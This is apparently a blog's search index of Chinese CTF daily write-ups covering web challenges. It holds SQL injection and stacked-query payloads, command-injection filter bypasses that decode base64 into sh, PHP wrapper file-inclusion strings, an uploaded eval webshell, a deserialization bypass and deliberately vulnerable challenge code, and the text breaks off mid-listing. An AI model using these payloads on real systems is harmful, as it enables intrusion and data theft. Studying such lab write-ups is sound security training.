<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20210518</title>
    <url>/posts/e38e795d/</url>
    <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
<p>不多数，sql注入</p>
</blockquote>
<p>万能密码</p>
<pre><code>username=admin&#39;or&#39;1&#39;=&#39;1&amp;password=admin&#39;or&#39;1&#39;=&#39;1
</code></pre>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>F12 get了一个参数，穿入dog,成功</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>各种姿势</p>
<pre><code>1&#39;
1&#39; #
1&#39; or 1=1 #
order by 2#
order by 3#
1&#39; union select 1,2# 
1&#39; union select 1,2,database()# 看库名 
1&#39;;show databases;#库名
1&#39;;show tables;#表名
0&#39;;desc `XXXXXX`;#查看表结构
0&#39;;show columns from XXX;#
0&#39;;show columns from `666666`; #(对以数字为表名的表进行操作时，需要加上`符号)
注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符
eg. mysql&gt; SELECT * FROM `table` WHERE `id` = &#39;123&#39; ;
1919810931114514必须用反单引号括起来
</code></pre>
<h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>改名后爆库：因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</p>
<p>payload:</p>
<pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
</code></pre>
<h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>预处理+堆叠注入</p>
<p>预处理语句：</p>
<pre><code>PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
</code></pre>
<p>通过变量传递：</p>
<pre><code>SET @tn = &#39;hahaha&#39;;  //存储表名
SET @sql = concat(&#39;select * from &#39;, @tn);  //存储SQL语句
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
</code></pre>
<p>本题即可利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>
<pre><code>char(115,101,108,101,99,116)&lt;-----&gt;&#39;select&#39;
</code></pre>
<p>payload1：不使用变量</p>
<pre><code>PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#
</code></pre>
<p>payload2：使用变量</p>
<pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
</code></pre>
<p>payload3：只是用contact(),不使用char()</p>
<pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#
</code></pre>
<p>参考：<a href="https://www.cnblogs.com/wjw-zm/p/12359735.html">https://www.cnblogs.com/wjw-zm/p/12359735.html</a></p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>20210515</title>
    <url>/posts/9d3f05e0/</url>
    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
<p>主要就是文件包含和php伪协议</p>
</blockquote>
<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
<pre><code>&lt;html&gt;
    &lt;!--
    secr3t.php        
    --&gt;
&lt;/html&gt;
</code></pre>
<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
<p>构造payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
<p>代码审计</p>
</blockquote>
<p>F12,提示source.php,打开代码审计</p>
<p>payload:</p>
<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
</code></pre>
<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20210516</title>
    <url>/posts/436545a/</url>
    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
<p>something wrong so I must use English</p>
</blockquote>
<p>command execustion and some strange sign</p>
<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
<pre><code>127.0.0.1 | cat /flag
</code></pre>
<p>| is a sign that just do the thing behind</p>
<p>|| if the first iswrong then do the second</p>
<p>&amp; is do both the two don’need right</p>
<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20210522</title>
    <url>/posts/2876c380/</url>
    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
</code></pre>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
<p>http协议</p>
</blockquote>
<p>改代理</p>
<pre><code>Referer:https://www.Sycsecret.com
</code></pre>
<p>改浏览器</p>
<pre><code>User-Agent:Syclover
</code></pre>
<p>简单XFF</p>
<pre><code>X-Forwarded-For:127.0.0.1
</code></pre>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
<p>sql注入</p>
</blockquote>
<p>扫根目录</p>
<pre><code>? num=1;var_dump(scandir(chr(47)))
</code></pre>
<p>flag文件内容</p>
<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
</code></pre>
<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
<p>文件上传</p>
</blockquote>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>20210519</title>
    <url>/posts/948949cb/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
<p>远程命令执行 绕过</p>
</blockquote>
<p>对空格进行了过滤绕过方法：</p>
<ul>
<li>${IFS}替换</li>
<li>$IFS$1替换</li>
<li>${IFS替换</li>
<li>%20替换</li>
<li>&lt;和&lt;&gt;重定向符替换</li>
<li>%09替换</li>
</ul>
<p>cat绕过</p>
<pre><code>(1)more:一页一页的显示档案内容

(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页

(3)head:查看头几行

(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示

(5)tail:查看尾几行

(6)nl：显示的时候，顺便输出行号

(7)od:以二进制的方式读取档案内容

(8)vi:一种编辑器，这个也可以查看

(9)vim:一种编辑器，这个也可以查看

(10)sort:可以查看

(11)uniq:可以查看

(12)file -f:报错出具体内容
</code></pre>
<p>先执行</p>
<pre><code>127.0.0.1|ls
</code></pre>
<p>看到有flag.php和index.php</p>
<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
<p>1 变量拼接</p>
<p>payload</p>
<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
</code></pre>
<p>2 base64编码</p>
<p>payload</p>
<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre>
<p>3 内敛绕过</p>
<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
</code></pre>
<p>将反引号里面的结果作为命令执行</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20210524</title>
    <url>/posts/c11566b5/</url>
    <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>-u  指定网址</p>
<p>-e   指定网站语言</p>
<p>-w   指定字典</p>
<p>-r    递归目录（跑出目录后，继续跑目录下面的目录）</p>
<p>-random-agents  使用随机UA</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre><code>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
</code></pre>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>先用dirsearch扫目录，找到index.php.bak，代码审计。</p>
<pre><code>&lt;?php
/**
* Created by PhpStorm.
* User: Norse
* Date: 2017/8/6
* Time: 20:22
*/
include_once &quot;flag.php&quot;;
ini_set(&quot;display_errors&quot;, 0);
$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 
$str = substr($str,1);              #字符串截取
$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);  #字符串替换
parse_str($str);                    #解析字符串为变量
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
    echo $flag.&quot;取得flag&quot;;
&#125;
?&gt;
</code></pre>
<p>利用MD5不处理数组的特性，构造两个key</p>
<pre><code>payload: http://114.67.246.176:19217/index.php?kkeyey1[]=1&amp;kkeyey2[]=2
</code></pre>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>姿势：</p>
<pre><code>id=0&#39; union select 1,2,3,4#
查数据库
id=0&#39; union select 1,2,3,database()#
查表
id=0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;库名&#39;# 
查列
id=0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;表名&#39;#
查值
id=0&#39; union select 1,2,3,列名 from 表名#
</code></pre>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>20210526</title>
    <url>/posts/2f1b0799/</url>
    <content><![CDATA[<h2 id="基于约束的sql注入"><a href="#基于约束的sql注入" class="headerlink" title="基于约束的sql注入"></a>基于约束的sql注入</h2><h2 id="dat-to-jpg"><a href="#dat-to-jpg" class="headerlink" title="dat to jpg"></a>dat to jpg</h2><p>dat文件转图片，先用前4个字节分别与FFD8 8950等异或，看异或后的值是不是个重复的，然后用脚本</p>
<pre><code>import os

out_path=&quot;./image&quot;

def imageDecode(f,fn):
    dat_read = open(f, &quot;rb&quot;)
    # out=&#39;P:\\&#39;+fn+&quot;.png&quot;
    out=out_path+fn+&quot;.png&quot;
    png_write = open(out, &quot;wb&quot;)
    for now in dat_read:
        for nowByte in now:
            newByte = nowByte ^ 0x9E
            png_write.write(bytes([newByte]))
    dat_read.close()
    png_write.close()


def findFile(f):
    fsinfo = os.listdir(f)
    for fn in fsinfo:
        temp_path = os.path.join(f, fn)
        if not os.path.isdir(temp_path):
            print(&#39;文件路径: &#123;&#125;&#39;.format(temp_path))
            print(fn)
            imageDecode(temp_path, fn)
        else:
            ...


# path = r&#39;C:\Users\输入自己微信存储路径\Data&#39;
# findFile(path)

path = r&quot;./dat&quot;
findFile(path)
</code></pre>
<h2 id="assert代码执行"><a href="#assert代码执行" class="headerlink" title="assert代码执行"></a>assert代码执行</h2><pre><code>?s=system(dir) # 扫目录
</code></pre>
<h2 id="冬至红包"><a href="#冬至红包" class="headerlink" title="冬至红包"></a>冬至红包</h2><p>一通绕过，</p>
<pre><code>&lt;?php
    error_reporting(0);
    require __DIR__.&#39;/flag.php&#39;;

    $exam = &#39;return\&#39;&#39;.sha1(time()).&#39;\&#39;;&#39;;

    if (!isset($_GET[&#39;flag&#39;])) &#123;
        echo &#39;&lt;a href=&quot;./?flag=&#39;.$exam.&#39;&quot;&gt;Click here&lt;/a&gt;&#39;;
    &#125;
    else if (strlen($_GET[&#39;flag&#39;]) != strlen($exam)) &#123;
        echo &#39;长度不允许&#39;;
    &#125;
    else if (preg_match(&#39;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#39;, $_GET[&#39;flag&#39;])) &#123;
        echo &#39;关键字不允许&#39;;
    &#125;
    else if (eval($_GET[&#39;flag&#39;]) === sha1($flag)) &#123;
        echo $flag;
    &#125;
    else &#123;
        echo &#39;马老师发生甚么事了&#39;;
    &#125;

    echo &#39;&lt;hr&gt;&#39;;

    highlight_file(__FILE__);
</code></pre>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>20210601</title>
    <url>/posts/810f4ee1/</url>
    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20210615</title>
    <url>/posts/9f79bbb9/</url>
    <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
<p>add_api.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
<p>放个链接<a href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>20210818</title>
    <url>/posts/eb56ea0e/</url>
    <content><![CDATA[<h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><p>代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(<span class="variable">$_GET</span>); <span class="comment">// 该函数使用数组键名作为变量名，使用数组键值作为变量值</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$f</span> = trim(file_get_contents(<span class="variable">$fn</span>)); <span class="comment">//将fn读入f中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>利用php伪协议，绕过file_get_contents()</p>
<pre><code>?ac=bugku&amp;fn=php://input
</code></pre>
<p>然后用hackbar随便post一下，比如id=1，用bp抓包，将id=删掉，就post个1，因为hackbar不能直接post一个数，php://input执行输入流，file_get_contents直接得到个1实现绕过</p>
<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>构造ac,使其和f一样，访问flag.txt获得内容bugku</p>
<pre><code>?ac=bugku&amp;fn=flag.txt
</code></pre>
<p>file_get_contents函数</p>
<p>把整个文件读入一个字符串中。</p>
<pre><code>&lt;?php
    echo file_get_contents(&quot;test.txt&quot;);
?&gt;
</code></pre>
<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><ol>
<li><p>php:// 访问输入输出流</p>
</li>
<li><p>php://filter 读取源代码并进行base64编码输出</p>
<pre><code> php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）
</code></pre>
<p> 后面的read和resource是参数，read过滤器</p>
</li>
<li><p>php://input 执行POST数据中的php代码</p>
</li>
<li><p>data:// 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输</p>
<pre><code> ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
</li>
</ol>
<h1 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h1><p>首先用伪协议直接读取upload.txt,没用，直接file=upload.php,上传文件，写一个一句话</p>
<pre><code>&lt;script language=php&gt;eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
</code></pre>
<p>然后上传用bp抓包，把后缀改成php:.jpg，contents改成images/jpeg</p>
<p>之后直接蚁剑连就行，在根目录下找到flag</p>
<h1 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h1><blockquote>
<p>反序列化</p>
</blockquote>
<p>先跑字典找到index.php.bak,之后代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>__wakeup函数绕过，改变量数量使之大于实际变量数量</p>
<p>先在本地尝试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;tac flag.php&#x27;</span>;<span class="comment">//过滤了cat,用tac和nl都行</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$ctf</span> =<span class="keyword">new</span> ctf();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$ctf</span>));</span><br></pre></td></tr></table></figure>

<p>得到<br>    O%3A3%3A%22ctf%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A12%3A%22tac+flag.php%22%3B%7D</p>
<p>再将变量数量改成3个，传入code就行</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>先看一下后端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$type</span> =  <span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos(<span class="variable">$type</span>,<span class="string">&quot;multipart/form-data&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">		<span class="variable">$file_ext</span> =  substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>);</span><br><span class="line">		<span class="keyword">if</span> (stripos(<span class="variable">$file_ext</span>,<span class="string">&quot;php&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line"><span class="keyword">if</span> ((stripos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>],<span class="string">&#x27;image&#x27;</span>)!== <span class="literal">False</span>) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$file_ext</span> =  substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>);</span><br><span class="line">        <span 